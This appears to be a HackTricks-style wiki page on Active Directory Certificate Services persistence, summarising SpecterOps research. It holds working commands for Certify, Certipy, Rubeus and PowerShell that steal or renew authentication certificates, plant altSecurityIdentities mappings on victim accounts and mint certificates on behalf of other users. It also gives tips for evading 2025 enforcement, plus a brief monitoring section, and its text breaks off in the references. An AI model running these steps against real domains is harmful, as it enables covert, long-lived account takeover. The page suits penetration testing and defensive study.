_body: "# AD CS Account Persistence\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n**This is a small summary of\
  \ the account persistence chapters of the awesome research from [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**\n\
  \n## Understanding Active User Credential Theft with Certificates – PERSIST1\n\nIn a scenario where a certificate that allows\
  \ domain authentication can be requested by a user, an attacker has the opportunity to request and steal this certificate\
  \ to maintain persistence on a network. By default, the `User` template in Active Directory allows such requests, though\
  \ it may sometimes be disabled.\n\nUsing [Certify](https://github.com/GhostPack/Certify) or [Certipy](https://github.com/ly4k/Certipy),\
  \ you can search for enabled templates that allow client authentication and then request one:\n\n```bash\n# Enumerate client-auth\
  \ capable templates\nCertify.exe find /clientauth\n\n# Request a user cert from an Enterprise CA (current user context)\n\
  Certify.exe request /ca:CA-SERVER\\CA-NAME /template:User\n\n# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a\
  \ PFX by default\ncertipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\\CA-NAME' -template 'User' -out user.pfx\n\
  ```\n\nA certificate’s power lies in its ability to authenticate as the user it belongs to, regardless of password changes,\
  \ as long as the certificate remains valid.\n\nYou can convert PEM to PFX and use it to obtain a TGT:\n\n```bash\n# Convert\
  \ PEM returned by Certify to PFX\nopenssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\"\
  \ -export -out cert.pfx\n\n# Use certificate for PKINIT and inject the TGT\nRubeus.exe asktgt /user:john /certificate:C:\\\
  Temp\\cert.pfx /password:CertPass! /ptt\n\n# Or with Certipy\ncertipy auth -pfx user.pfx -dc-ip 10.0.0.10\n```\n\n> Note:\
  \ Combined with other techniques (see THEFT sections), certificate-based auth allows persistent access without touching\
  \ LSASS and even from non-elevated contexts.\n\n## Gaining Machine Persistence with Certificates - PERSIST2\n\nIf an attacker\
  \ has elevated privileges on a host, they can enroll the compromised system’s machine account for a certificate using the\
  \ default `Machine` template. Authenticating as the machine enables S4U2Self for local services and can provide durable\
  \ host persistence:\n\n```bash\n# Request a machine certificate as SYSTEM\nCertify.exe request /ca:dc.theshire.local/theshire-DC-CA\
  \ /template:Machine /machine\n\n# Authenticate as the machine using the issued PFX\nRubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\\\
  Temp\\host.pfx /password:Passw0rd! /ptt\n```\n\n## Extending Persistence Through Certificate Renewal - PERSIST3\n\nAbusing\
  \ the validity and renewal periods of certificate templates lets an attacker maintain long-term access. If you possess a\
  \ previously issued certificate and its private key, you can renew it before expiration to obtain a fresh, long-lived credential\
  \ without leaving additional request artifacts tied to the original principal.\n\n```bash\n# Renewal with Certipy (works\
  \ with RPC/DCOM/WebEnrollment)\n# Provide the existing PFX and target the same CA/template when possible\ncertipy req -u\
  \ 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\\CA-NAME' \\\n            -template 'User' -pfx user_old.pfx -renew -out\
  \ user_renewed.pfx\n\n# Native Windows renewal with certreq\n# (use the serial/thumbprint of the cert to renew; reusekeys\
  \ preserves the keypair)\ncertreq -enroll -user -cert <SerialOrID> renew [reusekeys]\n```\n\n> Operational tip: Track lifetimes\
  \ on attacker-held PFX files and renew early. Renewal can also cause updated certificates to include the modern SID mapping\
  \ extension, keeping them usable under stricter DC mapping rules (see next section).\n\n## Planting Explicit Certificate\
  \ Mappings (altSecurityIdentities) – PERSIST4\n\nIf you can write to a target account’s `altSecurityIdentities` attribute,\
  \ you can explicitly map an attacker-controlled certificate to that account. This persists across password changes and,\
  \ when using strong mapping formats, remains functional under modern DC enforcement.\n\nHigh-level flow:\n\n1. Obtain or\
  \ issue a client-auth certificate you control (e.g., enroll `User` template as yourself).\n2. Extract a strong identifier\
  \ from the cert (Issuer+Serial, SKI, or SHA1-PublicKey).\n3. Add an explicit mapping on the victim principal’s `altSecurityIdentities`\
  \ using that identifier.\n4. Authenticate with your certificate; the DC maps it to the victim via the explicit mapping.\n\
  \nExample (PowerShell) using a strong Issuer+Serial mapping:\n\n```powershell\n# Example values - reverse the issuer DN\
  \ and serial as required by AD mapping format\n$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'\n$SerialR = '1200000000AC11000000002B'\
  \ # reversed byte order of the serial\n$Map     = \"X509:<I>$Issuer<SR>$SerialR\"\n\n# Add mapping to victim. Requires rights\
  \ to write altSecurityIdentities on the object\nSet-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}\n```\n\n\
  Then authenticate with your PFX. Certipy will obtain a TGT directly:\n\n```bash\ncertipy auth -pfx attacker_user.pfx -dc-ip\
  \ 10.0.0.10\n\n# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS\ncertipy auth -pfx\
  \ attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell\n```\n\n### Building Strong `altSecurityIdentities` Mappings\n\nIn practice,\
  \ **Issuer+Serial** and **SKI** mappings are the easiest strong formats to build from an attacker-held certificate. This\
  \ matters after **February 11, 2025**, when DCs default to **Full Enforcement** and weak mappings stop being reliable.\n\
  \n```bash\n# Extract issuer, serial and SKI from a cert/PFX\nopenssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out\
  \ attacker_user.crt\nopenssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier\n```\n\n```powershell\n\
  # Example strong SKI mapping for a user or computer object\n$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'\n\
  Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}\n# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}\n\
  ```\n\nNotes\n- Use strong mapping types only: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Weak formats\
  \ (Subject/Issuer, Subject-only, RFC822 email) are deprecated and can be blocked by DC policy.\n- The mapping works on both\
  \ **user** and **computer** objects, so write access to a computer account's `altSecurityIdentities` is enough to persist\
  \ as that machine.\n- The cert chain must build to a root trusted by the DC. Enterprise CAs in NTAuth are typically trusted;\
  \ some environments also trust public CAs.\n- Schannel authentication remains useful for persistence even when PKINIT fails\
  \ because the DC lacks the Smart Card Logon EKU or returns `KDC_ERR_PADATA_TYPE_NOSUPP`.\n\nFor more on weak explicit mappings\
  \ and attack paths, see:\n\n\n{{#ref}}\ndomain-escalation.md\n{{#endref}}\n\n## Enrollment Agent as Persistence – PERSIST5\n\
  \nIf you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates\
  \ on behalf of users at will and keep the agent PFX offline as a persistence token. Abuse workflow:\n\n```bash\n# Request\
  \ an Enrollment Agent cert (requires template rights)\nCertify.exe request /ca:CA-SERVER\\CA-NAME /template:\"Certificate\
  \ Request Agent\"\n\n# Mint a user cert on behalf of another principal using the agent PFX\nCertify.exe request /ca:CA-SERVER\\\
  CA-NAME /template:User \\\n                   /onbehalfof:CORP\\\\victim /enrollcert:C:\\Temp\\agent.pfx /enrollcertpw:AgentPfxPass\n\
  \n# Or with Certipy\ncertipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\\CA-NAME' \\\n           -template 'User'\
  \ -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx\n```\n\nRevocation of the agent certificate or template\
  \ permissions is required to evict this persistence.\n\nOperational notes\n- Modern `Certipy` versions support both `-on-behalf-of`\
  \ and `-renew`, so an attacker holding an Enrollment Agent PFX can mint and later renew leaf certificates without re-touching\
  \ the original target account.\n- If PKINIT-based TGT retrieval is not possible, the resulting on-behalf-of certificate\
  \ is still usable for Schannel authentication with `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.\n\n\
  ## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence\n\nMicrosoft KB5014754 introduced Strong Certificate\
  \ Mapping Enforcement on domain controllers. Since February 11, 2025, DCs default to Full Enforcement, rejecting weak/ambiguous\
  \ mappings. Practical implications:\n\n- Pre-2022 certificates that lack the SID mapping extension may fail implicit mapping\
  \ when DCs are in Full Enforcement. Attackers can maintain access by either renewing certificates through AD CS (to obtain\
  \ the SID extension) or by planting a strong explicit mapping in `altSecurityIdentities` (PERSIST4).\n- Explicit mappings\
  \ using strong formats (Issuer+Serial, SKI, SHA1-PublicKey) continue to work. Weak formats (Issuer/Subject, Subject-only,\
  \ RFC822) can be blocked and should be avoided for persistence.\n\nAdministrators should monitor and alert on:\n- Changes\
  \ to `altSecurityIdentities` and issuance/renewals of Enrollment Agent and User certificates.\n- CA issuance logs for on-behalf-of\
  \ requests and unusual renewal patterns.\n\n## References\n\n- Microsoft. KB5014754: Certificate-based authentication changes\
